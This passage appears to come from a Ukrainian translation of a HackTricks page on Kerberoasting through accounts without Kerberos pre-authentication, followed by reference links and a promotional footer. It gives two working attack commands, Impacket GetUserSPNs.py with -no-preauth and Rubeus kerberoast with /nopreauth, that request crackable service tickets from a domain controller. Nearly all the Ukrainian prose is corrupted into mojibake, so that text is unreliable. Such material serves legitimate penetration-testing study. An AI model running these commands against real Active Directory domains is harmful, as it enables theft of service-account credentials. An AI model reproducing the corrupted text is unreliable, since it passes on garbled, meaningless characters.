–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥–∞—Ç–∏ —Å–ø–∏—Å–æ–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –æ—Å–∫—ñ–ª—å–∫–∏ —É –Ω–∞—Å –Ω–µ–º–∞—î –¥—ñ–π—Å–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –¥–ª—è –∑–∞–ø–∏—Ç—É LDAP –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py –∑ PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus –∑ PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) –¥–ª—è –ª–µ–≥–∫–æ—ó –ø–æ–±—É–¥–æ–≤–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó —Ä–æ–±–æ—á–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞–π–±—ñ–ª—å—à **–ø—Ä–æ–¥–≤–∏–Ω—É—Ç–∏—Ö** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —Å–ø—ñ–ª—å–Ω–æ—Ç–∏ —É —Å–≤—ñ—Ç—ñ.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
